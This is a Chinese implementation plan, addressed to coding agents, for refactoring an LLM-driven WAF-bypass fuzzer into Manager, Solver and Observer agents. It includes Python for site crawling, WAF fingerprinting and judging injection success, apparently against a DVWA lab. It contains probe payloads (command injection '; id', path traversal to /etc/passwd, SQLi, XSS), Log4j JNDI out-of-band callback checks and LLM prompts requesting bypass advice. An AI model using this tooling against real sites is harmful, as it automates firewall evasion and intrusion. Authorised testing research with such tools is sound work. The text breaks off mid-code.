# Multi-Agent 架构重构实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 将单体 Agent（workflow.py 591 行 + llm_engine.py 679 行 + inline_parser.py 255 行 + requester.py 500 行）重构为 Manager + Solver + Observer 三层解耦多智能体系统，支持四维绕过（语义/协议/性能/拓扑）和自动注入点发现。

**Architecture:** Manager（LLM 智能调度）→ Solver（四维 Payload 生成+发包）→ Observer（独立证据判定），同步函数调用，dataclass 强类型传递。新增站点爬取器和 WAF 指纹识别器作为前置阶段。

**Tech Stack:** Python 3.11+, requests, pyyaml, openai, BeautifulSoup4 (爬取新增), dataclasses

**Spec:** `docs/superpowers/specs/2026-05-18-multi-agent-refactor-design.md`

**现有代码:** 7 个文件，共 2,424 行。依赖图：
```
workflow.py → llm_engine.py (无本地依赖)
            → baseliner.py → requester.py → inline_parser.py → llm_engine.py
            → memory_compressor.py → llm_engine.py
```

---

## Task 1: 数据模型层 (`agents/models.py`)

**Files:**
- Create: `agents/__init__.py`
- Create: `agents/models.py`

**说明:** 所有 Agent 共享的数据结构定义。后续每个 Task 都依赖此文件。

- [ ] **Step 1: 创建 agents 包和数据模型**

```python
# agents/__init__.py
```

```python
# agents/models.py
from __future__ import annotations
from dataclasses import dataclass, field


@dataclass
class InjectionPoint:
    url: str
    param: str
    method: str  # "GET" | "POST"
    vuln_type: str  # "cmdi" | "sqli" | "log4j"
    page_hint: str = ""
    inferred_context: str = ""
    closure_chars: list[str] = field(default_factory=list)
    # POST body 模板或 GET params 模板，含 {{INJECT}} 占位符
    body: str | None = None
    params: dict[str, str] | None = None
    headers: dict[str, str] = field(default_factory=dict)


@dataclass
class WAFProfile:
    detected: bool
    waf_name: str | None = None
    waf_vendor: str | None = None
    confidence: float = 0.0
    detection_methods: list[str] = field(default_factory=list)
    signatures: dict = field(default_factory=dict)
    bypass_tips: list[str] = field(default_factory=list)


@dataclass
class AttackPlan:
    dimension_priority: list[str] = field(default_factory=list)
    first_round_strategy: str = ""
    predicted_blocking: str = ""
    reasoning: str = ""


@dataclass
class SolverRequest:
    target: InjectionPoint
    strategy: str
    dimension: str  # "protocol" | "performance" | "semantic" | "topology"
    kb_context: str
    round_num: int
    blocked_payloads: list[str] = field(default_factory=list)
    waf_profile: WAFProfile | None = None


@dataclass
class RawResponse:
    payload: str
    status_code: int
    headers: dict
    body: str
    elapsed_ms: int
    dimension: str


@dataclass
class ObserverRequest:
    responses: list[RawResponse]
    baseline_html: str
    vuln_type: str
    baseline_elapsed_ms: int = 200  # 基线响应耗时，供时序判定使用
    oob_server: str | None = None
    oob_poll_api: str | None = None
    oob_tokens: dict[str, str] | None = None


@dataclass
class Verdict:
    payload: str
    is_bypass: bool
    evidence: str | None = None
    confidence: float = 0.0
    reason: str = ""


@dataclass
class ObserverResult:
    verdicts: list[Verdict] = field(default_factory=list)
    bypass_count: int = 0
    blocked_count: int = 0
    summary: str = ""


@dataclass
class RoundDecision:
    dimension: str
    strategy: str
    reasoning: str


@dataclass
class RoundRecord:
    round_num: int
    dimension: str
    strategy: str
    bypass_count: int
    blocked_count: int
    verdicts: list[Verdict]
```

- [ ] **Step 2: 验证导入**

Run: `cd core && python -c "from agents.models import InjectionPoint, WAFProfile, SolverRequest, RawResponse, ObserverRequest, Verdict, ObserverResult; print('OK')"`
Expected: `OK`

- [ ] **Step 3: Commit**

```bash
git add agents/__init__.py agents/models.py
git commit -m "feat: add data models for multi-agent architecture"
```

---

## Task 2: 站点爬取器 (`core/crawler.py`)

**Files:**
- Create: `core/crawler.py`
- Modify: `core/requirements.txt` (add beautifulsoup4)

**说明:** 从入口 URL 爬取所有可达页面，提取表单/参数/页面文本。不发探针，纯静态提取。

- [ ] **Step 1: 添加依赖**

在 `core/requirements.txt` 中追加：
```
beautifulsoup4>=4.12.0
```

- [ ] **Step 2: 实现 crawler.py**

```python
# core/crawler.py
"""站点爬取器：从入口 URL 发现所有表单和参数，供注入点推断使用。"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup


@dataclass
class CandidateForm:
    url: str
    action: str
    method: str  # "GET" | "POST"
    inputs: dict[str, str]  # param_name → placeholder/label 文本
    page_title: str = ""
    page_text: str = ""  # 表单周围的上下文文本


class SiteCrawler:
    def __init__(self, timeout: int = 10, max_pages: int = 50):
        self.timeout = timeout
        self.max_pages = max_pages
        self.session = requests.Session()
        self.session.trust_env = False
        self.visited: set[str] = set()

    def crawl(self, entry_url: str) -> list[CandidateForm]:
        """从入口 URL 爬取，返回所有发现的表单。"""
        candidates: list[CandidateForm] = []
        queue = [entry_url]

        while queue and len(self.visited) < self.max_pages:
            url = queue.pop(0)
            if url in self.visited:
                continue
            self.visited.add(url)

            try:
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            except requests.RequestException:
                continue

            soup = BeautifulSoup(resp.text, "html.parser")
            page_title = soup.title.string.strip() if soup.title and soup.title.string else ""

            # 提取表单
            for form in soup.find_all("form"):
                candidate = self._parse_form(url, form, page_title)
                if candidate:
                    candidates.append(candidate)

            # 提取页面内链接，加入队列
            for a in soup.find_all("a", href=True):
                link = urljoin(url, a["href"])
                parsed = urlparse(link)
                # 只爬同站链接
                if parsed.netloc == urlparse(entry_url).netloc and link not in self.visited:
                    queue.append(link)

        return candidates

    def _parse_form(self, page_url: str, form, page_title: str) -> CandidateForm | None:
        action = form.get("action", "")
        method = (form.get("method") or "GET").upper()
        action_url = urljoin(page_url, action) if action else page_url

        inputs: dict[str, str] = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            # 跳过 hidden/submit/button 类型（但保留有 value 的 hidden 用于 CSRF）
            inp_type = (inp.get("type") or "").lower()
            if inp_type in ("submit", "button", "reset"):
                continue
            label = self._find_label(inp, form)
            inputs[name] = label or inp.get("placeholder", "") or inp.get("value", "")

        if not inputs:
            return None

        # 提取表单周围的上下文文本
        context_text = ""
        parent = form.parent
        if parent:
            context_text = parent.get_text(separator=" ", strip=True)[:500]

        return CandidateForm(
            url=page_url,
            action=action_url,
            method=method,
            inputs=inputs,
            page_title=page_title,
            page_text=context_text,
        )

    def _find_label(self, inp, form) -> str:
        inp_id = inp.get("id")
        if inp_id:
            label = form.find("label", attrs={"for": inp_id})
            if label:
                return label.get_text(strip=True)
        # 尝试找最近的 label
        parent = inp.parent
        if parent and parent.name == "label":
            return parent.get_text(strip=True)
        return ""
```

- [ ] **Step 3: 验证爬取 DVWA**

Run: `cd core && python -c "from crawler import SiteCrawler; c = SiteCrawler(); forms = c.crawl('http://192.168.1.100:81/'); print(f'Found {len(forms)} forms'); [print(f'  {f.url} [{f.method}] inputs={list(f.inputs.keys())}') for f in forms]"`
Expected: 输出多个表单，包含 exec、sqli、sqli_blind 等页面的表单

- [ ] **Step 4: Commit**

```bash
git add core/crawler.py core/requirements.txt
git commit -m "feat: add site crawler for injection point discovery"
```

---

## Task 3: WAF 指纹识别器 (`core/waf_fingerprinter.py` + `config/waf_signatures.json`)

**Files:**
- Create: `core/waf_fingerprinter.py`
- Create: `config/waf_signatures.json`

**说明:** 被动检测（headers/cookies）+ 主动探测（发送低强度 payload）+ 指纹库比对。

- [ ] **Step 1: 创建 WAF 指纹库**

将 spec 第 8.3 节的 `waf_signatures.json` 内容写入 `config/waf_signatures.json`（Cloudflare、ModSecurity、AWS WAF、Imperva、Akamai、F5 BIG-IP ASM 六大 WAF）。

- [ ] **Step 2: 实现 waf_fingerprinter.py**

```python
# core/waf_fingerprinter.py
"""WAF 指纹识别器：检测目标是否有 WAF 并识别厂商。"""
from __future__ import annotations

import json
import os
import re
from pathlib import Path

import requests

from agents.models import WAFProfile

_SIGNATURES_PATH = Path(__file__).parent.parent / "config" / "waf_signatures.json"

# 探测 payload（低强度，用于触发 WAF 拦截页）
_PROBE_PAYLOADS = {
    "sqli": "' OR 1=1 --",
    "xss": "<script>alert(1)</script>",
    "cmdi": "; id",
    "traversal": "../../../etc/passwd",
}


class WAFFingerprinter:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.trust_env = False
        self.signatures = self._load_signatures()

    def _load_signatures(self) -> list[dict]:
        if _SIGNATURES_PATH.exists():
            return json.loads(_SIGNATURES_PATH.read_text(encoding="utf-8"))
        return []

    def fingerprint(self, url: str, headers: dict | None = None) -> WAFProfile:
        """对目标 URL 进行 WAF 指纹识别。"""
        detection_methods: list[str] = []
        matched_waf: dict | None = None
        matched_signatures: dict = {}

        # Step 1: 正常请求，检查响应头/cookie
        try:
            clean_resp = self.session.get(url, headers=headers, timeout=self.timeout)
        except requests.RequestException:
            return WAFProfile(detected=False)

        # Step 2: 被动指纹匹配
        passive_match = self._match_passive(clean_resp)
        if passive_match:
            detection_methods.append("passive_headers")
            matched_waf = passive_match["waf"]
            matched_signatures.update(passive_match["matched"])

        # Step 3: 主动探测
        probe_results = self._send_probes(url, headers)
        active_match = self._match_active(probe_results, clean_resp)
        if active_match:
            detection_methods.append("active_probe")
            if not matched_waf:
                matched_waf = active_match["waf"]
            matched_signatures.update(active_match["matched"])

        # Step 4: 组装结果
        if matched_waf:
            return WAFProfile(
                detected=True,
                waf_name=matched_waf.get("name"),
                waf_vendor=matched_waf.get("vendor"),
                confidence=0.9 if len(detection_methods) >= 2 else 0.7,
                detection_methods=detection_methods,
                signatures=matched_signatures,
                bypass_tips=matched_waf.get("bypass_tips", []),
            )

        # 没有匹配已知 WAF，但探测有拦截行为 → LLM 辅助分析
        if any(r.get("blocked") for r in probe_results):
            llm_result = self._llm_analyze(clean_resp, probe_results)
            return llm_result

        return WAFProfile(detected=False)

    def _llm_analyze(
        self,
        clean_resp: requests.Response,
        probe_results: list[dict],
    ) -> WAFProfile:
        """指纹库未命中时，调用 LLM 从响应特征推断 WAF 类型。"""
        from llm_engine import _chat_json

        headers_summary = "\n".join(f"  {k}: {v}" for k, v in clean_resp.headers.items())
        probe_summary = "\n".join(
            f"  [{r['type']}] status={r['status_code']} body={r['body'][:200]}"
            for r in probe_results if r.get("blocked")
        )

        prompt = f"""你是 WAF 指纹分析专家。以下是一个被 WAF 拦截的响应，请推断可能的 WAF 类型。

正常请求响应头：
{headers_summary}

被拦截的探测响应：
{probe_summary}

已知 WAF 签名未匹配。请从响应特征推断：
1. 可能的 WAF 类型（自建 WAF、小众 WAF、云厂商定制 WAF）
2. 检测引擎类型（正则/语义/机器学习）
3. 建议的绕过方向

返回 JSON：{{
  "waf_name": "推断的 WAF 名称",
  "confidence": 0-1,
  "engine_type": "正则/语义/ML",
  "bypass_tips": ["建议1", "建议2"],
  "reasoning": "推断理由"
}}"""

        try:
            result = _chat_json(prompt, model=None, temperature=0.3, max_tokens=512)
            if isinstance(result, dict):
                return WAFProfile(
                    detected=True,
                    waf_name=result.get("waf_name", "Unknown (LLM)"),
                    waf_vendor=None,
                    confidence=result.get("confidence", 0.5),
                    detection_methods=["llm_analysis"],
                    signatures={},
                    bypass_tips=result.get("bypass_tips", []),
                )
        except Exception:
            pass

        return WAFProfile(
            detected=True,
            waf_name="Unknown",
            waf_vendor=None,
            confidence=0.3,
            detection_methods=["active_probe"],
            signatures={},
            bypass_tips=["未知 WAF，建议从语义层开始探测拦截模式"],
        )

    def _match_passive(self, resp: requests.Response) -> dict | None:
        """检查响应头/cookie 匹配已知 WAF 指纹。"""
        resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
        resp_cookies = "; ".join(
            f"{c.name}={c.value}" for c in resp.cookies
        )
        all_header_values = " ".join(
            f"{k}: {v}" for k, v in resp_headers_lower.items()
        )
        combined = f"{all_header_values} {resp_cookies}".lower()

        for waf in self.signatures:
            matched: dict = {"headers": [], "cookies": []}
            for sig in waf.get("signatures", {}).get("headers", []):
                if sig.lower() in combined:
                    matched["headers"].append(sig)
            for sig in waf.get("signatures", {}).get("cookies", []):
                if sig.lower() in combined:
                    matched["cookies"].append(sig)

            if matched["headers"] or matched["cookies"]:
                return {"waf": waf, "matched": matched}

        return None

    def _send_probes(
        self, url: str, headers: dict | None
    ) -> list[dict]:
        """发送低强度探测 payload，收集响应。"""
        results = []
        for payload_type, payload in _PROBE_PAYLOADS.items():
            try:
                resp = self.session.get(
                    url,
                    params={"q": payload},
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=False,
                )
                results.append({
                    "type": payload_type,
                    "payload": payload,
                    "status_code": resp.status_code,
                    "body": resp.text[:2000],
                    "headers": dict(resp.headers),
                    "blocked": resp.status_code in (403, 406, 501, 429),
                })
            except requests.RequestException:
                continue
        return results

    def _match_active(
        self,
        probe_results: list[dict],
        clean_resp: requests.Response,
    ) -> dict | None:
        """从探测响应中匹配 WAF 拦截页特征。"""
        clean_body = clean_resp.text[:2000]

        for result in probe_results:
            if not result["blocked"]:
                # 对比响应体变化
                if result["body"] == clean_body:
                    continue

            combined_text = f"{result['body']} {' '.join(f'{k}: {v}' for k, v in result['headers'].items())}"

            for waf in self.signatures:
                for sig in waf.get("signatures", {}).get("block_page", []):
                    if re.search(sig, combined_text, re.IGNORECASE):
                        return {"waf": waf, "matched": {"block_page": sig}}

        return None
```

- [ ] **Step 3: 验证指纹识别**

Run: `cd core && python -c "from waf_fingerprinter import WAFFingerprinter; f = WAFFingerprinter(); p = f.fingerprint('http://192.168.1.100:81/'); print(f'detected={p.detected}, waf={p.waf_name}, confidence={p.confidence}')"`
Expected: 检测到 WAF（取决于目标是否部署了 WAF）

- [ ] **Step 4: Commit**

```bash
git add core/waf_fingerprinter.py config/waf_signatures.json
git commit -m "feat: add WAF fingerprinter with signature database"
```

---

## Task 4: Observer Agent (`agents/observer.py`)

**Files:**
- Create: `agents/observer.py`

**说明:** 独立判定 Agent。从 `inline_parser.py` 迁移证据提取逻辑，新增 Log4j OOB 检测，设计为可扩展的 Judge 注册模式。

- [ ] **Step 1: 实现 Observer 核心框架 + CMDI Judge**

从 `core/inline_parser.py` 迁移 `_extract_text_blocks`、`_filter_lines`、`_has_cmdi_evidence`，包装为 `CMDIJudge` 类。

```python
# agents/observer.py
"""Observer Agent：独立判定 HTTP 响应是否表明注入成功。"""
from __future__ import annotations

import html as html_lib
import re
from abc import ABC, abstractmethod

from agents.models import (
    ObserverRequest,
    ObserverResult,
    RawResponse,
    Verdict,
)

# ─── 从 inline_parser.py 迁移的文本提取工具 ───

_PRE_TAGS = re.compile(r"<pre[^>]*>(.*?)</pre>", re.DOTALL | re.IGNORECASE)
_CODE_TAGS = re.compile(
    r"<(?:code|samp|output)[^>]*>(.*?)</(?:code|samp|output)>",
    re.DOTALL | re.IGNORECASE,
)
_TEXTAREA_RO = re.compile(
    r'<textarea[^>]*readonly[^>]*>(.*?)</textarea>', re.DOTALL | re.IGNORECASE
)
_DIV_OUTPUT = re.compile(
    r'<div[^>]*class=["\']output["\'][^>]*>(.*?)</div>',
    re.DOTALL | re.IGNORECASE,
)
_HTML_TAG = re.compile(r"<[^>]+>")
_SCRIPT_STYLE = re.compile(
    r"<(script|style)[^>]*>.*?</\1>", re.DOTALL | re.IGNORECASE
)

# WAF 拦截页 / Shell 报错 / 噪声过滤
_FILTER_PATTERNS = [
    re.compile(r"Access Denied", re.IGNORECASE),
    re.compile(r"403 Forbidden", re.IGNORECASE),
    re.compile(r"Request Rejected", re.IGNORECASE),
    re.compile(r"ModSecurity", re.IGNORECASE),
    re.compile(r"command not found", re.IGNORECASE),
    re.compile(r"No such file or directory", re.IGNORECASE),
    re.compile(r"Permission denied", re.IGNORECASE),
    re.compile(r"bytes from.*icmp_seq.*ttl", re.IGNORECASE),
    re.compile(r"^\s*$"),
]

# CMDI 证据正则（从 inline_parser.py 迁移）
_CMDI_PASSWD_LINE = re.compile(
    r"^(root|daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|"
    r"backup|list|irc|gnats|nobody|systemd|_apt|messagebus|sshd):\S*:\d+:\d+",
    re.MULTILINE,
)
_CMDI_BASE64 = re.compile(r"[A-Za-z0-9+/=]{60,}")
_CMDI_CREATE_MARKER = re.compile(r"fzcr_[A-Za-z0-9]{4}")
_CMDI_LS_BLINDSIGHT = re.compile(
    r"^[-d][rwx-]{9}\s+.*\s+(fz_|fuzz_|cmdi_|waf_)\S+", re.MULTILINE
)

_CMDI_JNDI_ERROR = re.compile(
    r"javax\.naming\.(CommunicationException|NameNotFoundException)|"
    r"java\.lang\.ClassNotFoundException|JNDI lookup failed|"
    r"com\.sun\.jndi\.ldap\.LdapCtx|java\.rmi\.RemoteException",
    re.IGNORECASE,
)


def extract_text_blocks(html_content: str) -> str:
    """三级回退提取 HTML 中的文本块。"""
    # L1: <pre>
    m = _PRE_TAGS.search(html_content)
    if m:
        return _HTML_TAG.sub("", html_lib.unescape(m.group(1))).strip()
    # L2: <code>/<samp>/<output>/<textarea readonly>/<div class="output">
    for pattern in (_CODE_TAGS, _TEXTAREA_RO, _DIV_OUTPUT):
        m = pattern.search(html_content)
        if m:
            return _HTML_TAG.sub("", html_lib.unescape(m.group(1))).strip()
    # L3: <body> 纯文本
    body_match = re.search(r"<body[^>]*>(.*?)</body>", html_content, re.DOTALL | re.IGNORECASE)
    text = body_match.group(1) if body_match else html_content
    text = _SCRIPT_STYLE.sub("", text)
    text = _HTML_TAG.sub("", html_lib.unescape(text))
    return text.strip()


def baseline_diff(extracted: str, baseline: str) -> str | None:
    """行级差集，返回增量文本。无增量返回 None。"""
    base_lines = set(baseline.splitlines())
    new_lines = [l for l in extracted.splitlines() if l not in base_lines]
    if not new_lines:
        return None
    return "\n".join(new_lines)


def filter_lines(text: str) -> str:
    """逐行过滤噪声。"""
    lines = text.splitlines()
    filtered = [
        l for l in lines
        if not any(p.search(l) for p in _FILTER_PATTERNS) and l.strip()
    ]
    return "\n".join(filtered)


# ─── Judge 抽象基类 ───

class Judge(ABC):
    @abstractmethod
    def judge(
        self,
        response: RawResponse,
        extracted_text: str,
        diff_text: str | None,
        baseline_elapsed_ms: int,
    ) -> Verdict:
        ...


# ─── CMDI Judge（硬编码正则，零 Token）───

class CMDIJudge(Judge):
    def judge(
        self,
        response: RawResponse,
        extracted_text: str,
        diff_text: str | None,
        baseline_elapsed_ms: int,
    ) -> Verdict:
        # 状态码短路
        if response.status_code in (403, 406, 501, 429):
            return Verdict(
                payload=response.payload,
                is_bypass=False,
                confidence=1.0,
                reason=f"HTTP {response.status_code} blocked",
            )

        if diff_text is None:
            return Verdict(
                payload=response.payload,
                is_bypass=False,
                confidence=0.9,
                reason="无增量回显",
            )

        filtered = filter_lines(diff_text)
        if not filtered:
            return Verdict(
                payload=response.payload,
                is_bypass=False,
                confidence=0.9,
                reason="增量内容被过滤为噪声",
            )

        # 读取类检测
        if _CMDI_PASSWD_LINE.search(filtered):
            evidence = _CMDI_PASSWD_LINE.search(filtered).group(0)[:200]
            return Verdict(
                payload=response.payload,
                is_bypass=True,
                evidence=evidence,
                confidence=0.95,
                reason="检测到 /etc/passwd 系统账户行",
            )

        if _CMDI_BASE64.search(filtered):
            match = _CMDI_BASE64.search(filtered).group(0)
            return Verdict(
                payload=response.payload,
                is_bypass=True,
                evidence=match[:200],
                confidence=0.9,
                reason="检测到 ≥60 字符 base64 串",
            )

        # 创建类检测
        if _CMDI_CREATE_MARKER.search(filtered):
            match = _CMDI_CREATE_MARKER.search(filtered).group(0)
            return Verdict(
                payload=response.payload,
                is_bypass=True,
                evidence=match,
                confidence=0.95,
                reason="检测到 fzcr_ 创建标记",
            )

        # 删除类检测
        if _CMDI_LS_BLINDSIGHT.search(diff_text):
            return Verdict(
                payload=response.payload,
                is_bypass=True,
                evidence="ls 输出中含 fz_/fuzz_/cmdi_/waf_ 文件",
                confidence=0.8,
                reason="ls 盲测检测到标记文件",
            )

        return Verdict(
            payload=response.payload,
            is_bypass=False,
            confidence=0.7,
            reason="CMDI 证据未命中",
        )


# ─── SQLi Judge（LLM 独立判定）───

class SQLiJudge(Judge):
    def judge(
        self,
        response: RawResponse,
        extracted_text: str,
        diff_text: str | None,
        baseline_elapsed_ms: int,
    ) -> Verdict:
        if response.status_code in (403, 406, 501, 429):
            return Verdict(
                payload=response.payload,
                is_bypass=False,
                confidence=1.0,
                reason=f"HTTP {response.status_code} blocked",
            )

        if diff_text is None and response.elapsed_ms < baseline_elapsed_ms * 3:
            return Verdict(
                payload=response.payload,
                is_bypass=False,
                confidence=0.8,
                reason="无增量回显且无显著延时",
            )

        # 延时异常 → 可能是时间盲注
        if response.elapsed_ms >= baseline_elapsed_ms * 3:
            return Verdict(
                payload=response.payload,
                is_bypass=True,
                evidence=f"响应延时 {response.elapsed_ms}ms，基线 {baseline_elapsed_ms}ms",
                confidence=0.7,
                reason="响应延时异常，疑似时间盲注",
            )

        # 有增量回显 → 快速规则匹配 + LLM 深度判定
        if diff_text:
            # 快速规则匹配：数据库错误信息
            db_errors = [
                "You have an error in your SQL syntax",
                "mysql_fetch", "mysqli_", "pg_query", "ORA-",
                "SQLite3::", "Unclosed quotation mark",
            ]
            for err in db_errors:
                if err.lower() in diff_text.lower():
                    return Verdict(
                        payload=response.payload,
                        is_bypass=True,
                        evidence=diff_text[:200],
                        confidence=0.9,
                        reason=f"检测到数据库错误信息: {err}",
                    )

            # LLM 深度判定：Observer 独立 Prompt，不传 payload 语义
            return self._llm_judge(diff_text, response.elapsed_ms, baseline_elapsed_ms)

        return Verdict(
            payload=response.payload,
            is_bypass=False,
            confidence=0.7,
            reason="SQLi 证据未命中",
        )

    def _llm_judge(self, diff_text: str, elapsed_ms: int, baseline_ms: int) -> Verdict:
        """调用 LLM 独立判定 SQLi 是否成功。不传 payload 语义。"""
        from llm_engine import _chat_json

        prompt = f"""你是一个独立的 HTTP 响应分析器。判断以下响应是否表明存在 SQL 注入成功的迹象。
你不知道发送了什么 payload，只能从响应本身判断。

响应文本：{diff_text[:1000]}
响应耗时：{elapsed_ms}ms
基线耗时：{baseline_ms}ms

判断标准：
1. 响应是否包含数据库结构信息（表名、列名、数据库版本）？
2. 响应是否包含非页面框架的用户数据？
3. 响应耗时是否显著异常（>3x 基线）？
4. 响应是否包含 MySQL/PostgreSQL/Oracle 错误信息中嵌套的数据？

返回 JSON：{{"bypass": true/false, "confidence": 0-1, "reason": "..."}}"""

        try:
            result = _chat_json(prompt, model=None, temperature=0.1, max_tokens=256)
            if isinstance(result, dict):
                return Verdict(
                    payload="",
                    is_bypass=result.get("bypass", False),
                    evidence=diff_text[:200],
                    confidence=result.get("confidence", 0.5),
                    reason=result.get("reason", "LLM 判定"),
                )
        except Exception:
            pass

        return Verdict(
            payload="",
            is_bypass=False,
            confidence=0.5,
            reason="LLM 判定失败，保守返回 blocked",
        )


# ─── Log4j Judge（OOB + 错误型 + 时序型）───

class Log4jJudge(Judge):
    def judge(
        self,
        response: RawResponse,
        extracted_text: str,
        diff_text: str | None,
        baseline_elapsed_ms: int,
    ) -> Verdict:
        if response.status_code in (403, 406, 501, 429):
            return Verdict(
                payload=response.payload,
                is_bypass=False,
                confidence=1.0,
                reason=f"HTTP {response.status_code} blocked",
            )

        # 错误型检测：JNDI 异常堆栈
        combined_text = f"{extracted_text} {diff_text or ''}"
        if _CMDI_JNDI_ERROR.search(combined_text):
            match = _CMDI_JNDI_ERROR.search(combined_text).group(0)
            return Verdict(
                payload=response.payload,
                is_bypass=True,
                evidence=match,
                confidence=0.9,
                reason=f"检测到 JNDI 异常: {match}",
            )

        # 时序型检测
        if response.elapsed_ms >= 3000 and baseline_elapsed_ms < 500:
            return Verdict(
                payload=response.payload,
                is_bypass=True,
                evidence=f"响应延时 {response.elapsed_ms}ms，基线 {baseline_elapsed_ms}ms",
                confidence=0.5,
                reason="JNDI lookup 超时，需 OOB 二次确认",
            )

        return Verdict(
            payload=response.payload,
            is_bypass=False,
            confidence=0.7,
            reason="Log4j 证据未命中（OOB 由 Observer.evaluate 统一检查）",
        )


def _check_oob(oob_poll_api: str, oob_tokens: dict[str, str], timeout_ms: int = 30000) -> dict[str, bool]:
    """轮询 OOB 回调服务器，返回每个 token 是否收到回调。"""
    import requests as req
    results: dict[str, bool] = {}
    for idx, token in oob_tokens.items():
        try:
            resp = req.get(
                oob_poll_api,
                params={"token": token},
                timeout=timeout_ms / 1000,
            )
            data = resp.json() if resp.ok else {}
            results[idx] = data.get("received", False)
        except Exception:
            results[idx] = False
    return results


# ─── GenericJudge（通用回退）───

class GenericJudge(Judge):
    """未知漏洞类型的通用判定：状态码短路 + 基线 diff。"""

    def judge(
        self,
        response: RawResponse,
        extracted_text: str,
        diff_text: str | None,
        baseline_elapsed_ms: int,
    ) -> Verdict:
        if response.status_code in (403, 406, 501, 429):
            return Verdict(
                payload=response.payload,
                is_bypass=False,
                confidence=1.0,
                reason=f"HTTP {response.status_code} blocked",
            )
        if diff_text:
            return Verdict(
                payload=response.payload,
                is_bypass=True,
                evidence=diff_text[:200],
                confidence=0.5,
                reason="有增量回显（通用判定，低置信度）",
            )
        return Verdict(
            payload=response.payload,
            is_bypass=False,
            confidence=0.7,
            reason="无增量回显",
        )


# ─── Observer 主类 ───

class Observer:
    JUDGES: dict[str, Judge] = {
        "cmdi": CMDIJudge(),
        "sqli": SQLiJudge(),
        "log4j": Log4jJudge(),
        "deserialization": Log4jJudge(),
    }

    def evaluate(self, request: ObserverRequest) -> ObserverResult:
        judge = self.JUDGES.get(request.vuln_type, GenericJudge())

        # 先提取 baseline 文本块
        baseline_text = extract_text_blocks(request.baseline_html)

        # OOB 预检（Log4j/deserialization）
        oob_results: dict[str, bool] = {}
        if request.oob_poll_api and request.oob_tokens:
            oob_results = _check_oob(
                request.oob_poll_api,
                request.oob_tokens,
                timeout_ms=30000,
            )

        verdicts: list[Verdict] = []
        for idx, resp in enumerate(request.responses):
            # 状态码短路
            if resp.status_code in (403, 406, 501, 429):
                verdicts.append(Verdict(
                    payload=resp.payload,
                    is_bypass=False,
                    confidence=1.0,
                    reason=f"HTTP {resp.status_code} blocked",
                ))
                continue

            # OOB 回调已收到 → 直接判定 bypass
            if oob_results.get(str(idx)):
                verdicts.append(Verdict(
                    payload=resp.payload,
                    is_bypass=True,
                    evidence="OOB 回调服务器收到出站连接",
                    confidence=1.0,
                    reason="OOB 回调确认 JNDI 注入成功",
                ))
                continue

            extracted = extract_text_blocks(resp.body)
            diff = baseline_diff(extracted, baseline_text)

            verdict = judge.judge(
                resp, extracted, diff,
                baseline_elapsed_ms=request.baseline_elapsed_ms,
            )
            verdicts.append(verdict)

        bypass_count = sum(1 for v in verdicts if v.is_bypass)
        blocked_count = len(verdicts) - bypass_count

        return ObserverResult(
            verdicts=verdicts,
            bypass_count=bypass_count,
            blocked_count=blocked_count,
            summary=f"{bypass_count} bypass / {blocked_count} blocked",
        )
```

- [ ] **Step 2: 验证 Observer 导入**

Run: `cd core && python -c "from agents.observer import Observer, CMDIJudge, SQLiJudge, Log4jJudge, extract_text_blocks, baseline_diff; print('OK')"`
Expected: `OK`

- [ ] **Step 3: Commit**

```bash
git add agents/observer.py
git commit -m "feat: add Observer agent with CMDI/SQLi/Log4j judges"
```

---

## Task 5: Solver Agent + SemanticSolver 引擎

**Files:**
- Create: `agents/solver.py`
- Create: `agents/solver_engines/__init__.py`
- Create: `agents/solver_engines/base.py`
- Create: `agents/solver_engines/semantic.py`

**说明:** Solver 路由器 + 语义执行层引擎。从 `llm_engine.py` 迁移 Payload 生成逻辑，从 `requester.py` 迁移发包逻辑。

- [ ] **Step 1: 实现 SolverEngine 基类和 SemanticSolver**

```python
# agents/solver_engines/__init__.py
```

```python
# agents/solver_engines/base.py
"""SolverEngine 抽象基类。"""
from __future__ import annotations
from abc import ABC, abstractmethod
from agents.models import SolverRequest, RawResponse


class SolverEngine(ABC):
    @abstractmethod
    def generate(self, request: SolverRequest) -> list[str]:
        """生成 payload 列表。"""
        ...

    @abstractmethod
    def send(self, payloads: list[str], request: SolverRequest) -> list[RawResponse]:
        """发包并返回原始响应。"""
        ...
```

```python
# agents/solver_engines/semantic.py
"""语义执行层引擎：LLM 生成/变异 Payload + 发包。"""
from __future__ import annotations

import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote

import requests

from agents.models import SolverRequest, RawResponse
from agents.solver_engines.base import SolverEngine

# 从 llm_engine.py 迁移的 LLM 调用工具
from llm_engine import (
    generate_initial_payloads,
    mutate_payloads,
    init_client,
    _get_client,
)


class SemanticSolver(SolverEngine):
    def __init__(self, concurrency: int = 5, timeout: int = 15):
        self.concurrency = concurrency
        self.timeout = timeout
        self.session = requests.Session()
        self.session.trust_env = False

    def generate(self, request: SolverRequest) -> list[str]:
        """调用 LLM 生成/变异 Payload。"""
        client = _get_client()
        model = client._model  # 从 client 获取 model 名

        if request.round_num == 0:
            result = generate_initial_payloads(
                vuln_type=request.target.vuln_type,
                target_url=request.target.url,
                model=model,
                kb_context=request.kb_context,
            )
        else:
            result = mutate_payloads(
                failed_payloads=request.blocked_payloads,
                vuln_type=request.target.vuln_type,
                target_url=request.target.url,
                model=model,
                kb_context=request.kb_context,
                force_strategy_change=False,
            )

        return result.get("payloads", [])

    def send(self, payloads: list[str], request: SolverRequest) -> list[RawResponse]:
        """并发发包，返回原始响应。"""
        target = request.target
        results: list[RawResponse] = []

        with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            futures = {}
            for payload in payloads:
                fut = executor.submit(
                    self._send_single, payload, target
                )
                futures[fut] = payload

            for fut in as_completed(futures):
                try:
                    results.append(fut.result())
                except Exception:
                    payload = futures[fut]
                    results.append(RawResponse(
                        payload=payload,
                        status_code=0,
                        headers={},
                        body="",
